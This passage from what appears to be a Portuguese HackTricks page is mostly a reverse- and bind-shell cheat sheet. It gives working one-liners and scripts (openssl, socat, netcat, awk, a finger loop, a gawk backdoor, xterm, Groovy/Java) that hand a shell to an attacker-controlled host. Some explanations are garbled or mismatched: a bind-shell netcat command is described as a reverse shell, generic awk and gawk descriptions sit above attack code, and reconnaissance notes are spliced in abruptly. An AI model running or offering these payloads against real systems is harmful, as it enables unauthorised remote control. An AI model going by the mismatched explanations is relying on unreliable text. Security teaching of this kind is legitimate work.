- Mapeamento de rede: Mapear a rede do alvo pode ajudar a identificar outros sistemas e dispositivos conectados a ele.
- Coleta de informações de login: Coletar informações de login, como nomes de usuário e senhas, pode ajudar a realizar ataques de força bruta ou ataques de dicionário.

## Ferramentas e Recursos

Existem várias ferramentas e recursos disponíveis para ajudar na identificação e coleta de informações sobre o alvo. Alguns exemplos incluem:

- Nmap: Uma ferramenta de varredura de portas que pode ajudar a identificar quais portas estão abertas no alvo.
- Recon-ng: Uma ferramenta de reconhecimento que pode ajudar a coletar informações de domínio, endereços de e-mail, nomes de usuários, etc.
- Shodan: Um mecanismo de busca para dispositivos conectados à Internet, que pode ajudar a identificar sistemas vulneráveis.
- Google Dorks: Consultas de pesquisa específicas que podem ser usadas para encontrar informações sensíveis publicamente disponíveis.

## Conclusão

Identificar e coletar informações detalhadas sobre o alvo é um passo crucial em qualquer teste de penetração. Essas informações ajudam a entender melhor o sistema ou rede que está sendo testado e podem ajudar a identificar possíveis vulnerabilidades.
```bash
#Linux
openssl s_client -quiet -connect <ATTACKER_IP>:<PORT1>|/bin/bash|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>

#Windows
openssl.exe s_client -quiet -connect <ATTACKER_IP>:<PORT1>|cmd.exe|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>
```
## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

### Shell de Bind

A shell de bind é uma técnica de hacking que envolve a criação de um ponto de acesso em um sistema alvo, permitindo que um invasor se conecte a ele. O Socat é uma ferramenta útil para criar uma shell de bind em sistemas Linux. Ele permite que você redirecione conexões de entrada e saída para um determinado endereço IP e porta.

Para usar o Socat para criar uma shell de bind, você precisa primeiro baixar o binário estático do Socat. Você pode encontrar o binário estático do Socat no seguinte link: [https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

Depois de baixar o binário estático do Socat, você pode executar o seguinte comando para criar uma shell de bind:

```
socat TCP-LISTEN:<porta>,fork EXEC:/bin/bash
```

Substitua `<porta>` pela porta desejada para a shell de bind. Este comando irá criar um ponto de acesso na porta especificada e redirecionar todas as conexões de entrada para uma shell interativa do Bash.

Depois de executar o comando, você pode se conectar à shell de bind usando um cliente de terminal, como o Netcat, e o endereço IP e porta do sistema alvo. Isso permitirá que você execute comandos no sistema alvo e interaja com ele como se estivesse fisicamente presente nele.

Lembre-se de que a criação de uma shell de bind em um sistema sem permissão é ilegal e pode resultar em consequências legais graves. Esta técnica deve ser usada apenas para fins educacionais ou em sistemas em que você tenha permissão explícita para realizar testes de segurança.
```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP:<victim_ip>:1337
```
Um shell reverso é uma técnica usada em hacking para obter acesso a um sistema remoto. Em vez de estabelecer uma conexão direta com o sistema alvo, o hacker cria um shell reverso no sistema comprometido, permitindo que ele se conecte de volta ao seu próprio sistema. Isso é útil quando o sistema alvo está protegido por um firewall ou possui restrições de conexão.

Existem várias maneiras de criar um shell reverso em sistemas Linux. Uma abordagem comum é usar o Netcat, uma ferramenta de rede versátil. O Netcat pode ser usado para redirecionar a entrada e saída de um programa para uma conexão de rede. Para criar um shell reverso com o Netcat, você precisa executar os seguintes comandos:

No sistema alvo:
```
nc -lvp <porta> -e /bin/bash
```

No sistema do hacker:
```
nc <endereço IP do sistema alvo> <porta>
```

Outra opção é usar o Metasploit Framework, uma plataforma de teste de penetração amplamente utilizada. O Metasploit oferece vários módulos que podem ser usados para criar shells reversos em sistemas Linux. Esses módulos fornecem recursos adicionais, como criptografia e compressão de dados.

Independentemente da abordagem escolhida, é importante lembrar que a criação de um shell reverso em um sistema sem permissão é ilegal e pode resultar em consequências legais graves. O conhecimento dessas técnicas deve ser usado apenas para fins éticos e autorizados, como testes de segurança em sistemas de TI.
```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```
## Awk

O Awk é uma poderosa ferramenta de processamento de texto que permite buscar, filtrar e manipular dados em arquivos de texto. Ele é amplamente utilizado em sistemas Linux para realizar tarefas como extração de informações, formatação de saída e processamento de registros.

O Awk funciona lendo o arquivo de entrada linha por linha e aplicando um conjunto de regras definidas pelo usuário. Cada regra consiste em um padrão e uma ação associada. Quando um padrão é correspondido em uma linha, a ação correspondente é executada.

A sintaxe básica do Awk é a seguinte:

```
awk 'padrão {ação}' arquivo
```

O padrão pode ser uma expressão regular, uma comparação numérica ou uma combinação de ambos. A ação pode ser um comando único ou um bloco de comandos delimitado por chaves.

O Awk fornece uma variedade de variáveis internas que podem ser usadas nas ações, como $0 (a linha inteira), $1, $2, ... (os campos separados por espaço em branco) e NF (o número total de campos).

Além disso, o Awk possui uma série de funções embutidas que podem ser usadas para realizar operações matemáticas, manipulação de strings e muito mais.

O Awk é uma ferramenta extremamente flexível e versátil, e pode ser usado de várias maneiras para manipular dados de texto. É uma habilidade essencial para qualquer hacker ou administrador de sistemas Linux.
```bash
awk 'BEGIN {s = "/inet/tcp/0/<IP>/<PORT>"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```
O atacante pode usar o comando `finger` para obter informações sobre os usuários de um sistema Linux. O comando `finger` exibe detalhes como nome, login, diretório inicial, último login e status de conexão de um usuário específico. Essas informações podem ser úteis para o atacante obter mais informações sobre os usuários do sistema e planejar ataques direcionados.
```bash
while true; do nc -l 79; done
```
Para enviar o comando, escreva-o, pressione enter e pressione CTRL+D (para parar o STDIN)

**Vítima**
```bash
export X=Connected; while true; do X=`eval $(finger "$X"@<IP> 2> /dev/null')`; sleep 1; done

export X=Connected; while true; do X=`eval $(finger "$X"@<IP> 2> /dev/null | grep '!'|sed 's/^!//')`; sleep 1; done
```
## Gawk

O Gawk é uma poderosa ferramenta de processamento de texto que permite a manipulação e análise de dados em arquivos de texto. Ele é uma versão aprimorada do awk, uma linguagem de programação de script usada principalmente para filtrar e transformar dados.

O Gawk possui uma sintaxe simples e flexível, permitindo que os usuários escrevam scripts eficientes para realizar várias tarefas de processamento de texto. Ele suporta uma ampla gama de recursos, incluindo expressões regulares, estruturas de controle, funções embutidas e manipulação de campos.

Uma das principais vantagens do Gawk é sua capacidade de processar grandes volumes de dados de forma rápida e eficiente. Ele pode ser usado para realizar tarefas como filtrar linhas com base em padrões, calcular estatísticas, realizar substituições de texto e muito mais.

Além disso, o Gawk possui recursos avançados, como a capacidade de processar arquivos em paralelo e a capacidade de trabalhar com dados estruturados, como JSON e XML.

Para usar o Gawk, basta digitar o comando `gawk` seguido do script awk que você deseja executar e o nome do arquivo de entrada. O Gawk irá processar o arquivo de entrada de acordo com o script fornecido e exibir o resultado na saída padrão.

O Gawk é uma ferramenta poderosa e versátil que pode ser usada para uma ampla variedade de tarefas de processamento de texto. Com sua sintaxe simples e recursos avançados, é uma escolha popular entre os hackers e analistas de dados.
```bash
#!/usr/bin/gawk -f

BEGIN {
Port    =       8080
Prompt  =       "bkd> "

Service = "/inet/tcp/" Port "/0/0"
while (1) {
do {
printf Prompt |& Service
Service |& getline cmd
if (cmd) {
while ((cmd |& getline) > 0)
print $0 |& Service
close(cmd)
}
} while (cmd != "exit")
close(Service)
}
}
```
## Xterm

Uma das formas mais simples de shell reverso é uma sessão xterm. O comando a seguir deve ser executado no servidor. Ele tentará se conectar de volta a você (10.0.0.1) na porta TCP 6001.
```bash
xterm -display 10.0.0.1:1
```
Para capturar o xterm que está chegando, inicie um X-Server (:1 - que escuta na porta TCP 6001). Uma maneira de fazer isso é com o Xnest (a ser executado em seu sistema):
```bash
Xnest :1
```
Você precisará autorizar o alvo a se conectar a você (comando também executado em seu host):
```bash
xhost +targetip
```
## Groovy

por [frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76) NOTA: O shell reverso Java também funciona para Groovy
```bash
String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```
## Bibliografia

{% embed url="https://highon.coffee/blog/reverse-shell-cheat-sheet/" %}

{% embed url="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell" %}

{% embed url="https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/" %}

{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md" %}

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Encontre vulnerabilidades que são mais importantes para que você possa corrigi-las mais rapidamente. O Intruder rastreia sua superfície de ataque, executa varreduras proativas de ameaças, encontra problemas em toda a sua pilha de tecnologia, desde APIs até aplicativos da web e sistemas em nuvem. [**Experimente gratuitamente**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) hoje.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}


<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de cibersegurança**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
